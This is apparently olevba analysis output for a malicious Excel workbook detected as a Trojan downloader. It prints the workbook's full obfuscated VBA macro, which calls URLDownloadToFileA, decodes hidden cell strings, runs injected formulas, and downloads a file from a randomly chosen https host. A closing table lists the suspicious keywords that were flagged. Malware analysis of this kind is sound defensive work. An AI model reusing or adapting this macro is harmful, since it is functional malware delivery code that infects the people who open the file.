olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./HEUR-Trojan-Downloader.MSOffice.Agent.gen
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 And Win64 Then
    Private Declare PtrSafe Function f_ord_c Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As LongPtr, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As LongPtr, _
        ByVal lpfnCB As LongPtr _
      ) As Long
#Else
    Private Declare Function f_ord_c Lib "urlmon" _
      Alias "URLDownloadToFileA" ( _
        ByVal pCaller As Long, _
        ByVal szURL As String, _
        ByVal szFileName As String, _
        ByVal dwReserved As Long, _
        ByVal lpfnCB As Long _
      ) As Long
#End If

Function f_size_one()
f_size_one = "Z"
End Function




Sub View_AllinOne()
RGB_print = Split(RTrim(rr_timer(rr_timer(Cells(150 * 2 + 100, 1 * 5)))), l_size_two("V", 4))
Sheets(1).Cells(3, 1).Name = "Next_" & "page"
print_lay1 = prct_progress(RGB_print(1))
For Ii = 0 To UBound(print_lay1) - LBound(print_lay1) + msoColorTypeRGB
On Error Resume Next
doc_for_pay (print_lay1(Ii))
Application.Run ("Next_" & "page")
If Ii = msoUnderlineDotDashHeavyLine Then eCHOexits = n_next_size:
If Ii = msoUnderlineDotDotDashHeavyLine Then
border_print_1 = n_next_size
f_ord_c 0, vext_next(yy_resize(Split(RGB_print(0), "$" & "$"))), eCHOexits & "\" & border_print_1, 0, 0
End If
Next
End Sub


Function yy_resize(Rr As Variant) As String
Randomize: rt = xlArrangeStyleTiled
v = UBound(Rr) + rt
yy_resize = Rr(Int((v) * Rnd))
End Function


Function l_size_two(u As String, t As Integer)
l_size_two = Replace(String(t, f_size_one), f_size_one, u)
End Function


Public Function vext_next(tt As String)
vext_next = "ht" & "t" & "p" & "s://" & tt
End Function






Function font_bbold()
font_bbold = "J1:J3"
End Function



Function prct_progress(e As Variant) As Variant
prct_progress = Split(e, l_size_two("+", 4))
End Function



Function n_next_size()
n_next_size = Sheets(vbNull).Cells(2, 10)
End Function

Function doc_for_pay(i As String)
Sheets(vbNull).Cells(3, 1).Value = "=" & i
End Function




Function rr_timer(mii As String)
sec_ss = mii
bigChats = Len(sec_ss) \ xlFilterStatusDateHasTime
For sdd = xlY To bigChats
leftPIC = leftPIC & Mid(sec_ss, sdd, xlPrimary) & Mid(sec_ss, sdd + bigChats, xlDataBarFillGradient)
Next
rr_timer = leftPIC
End Function










+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |yy_resize           |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

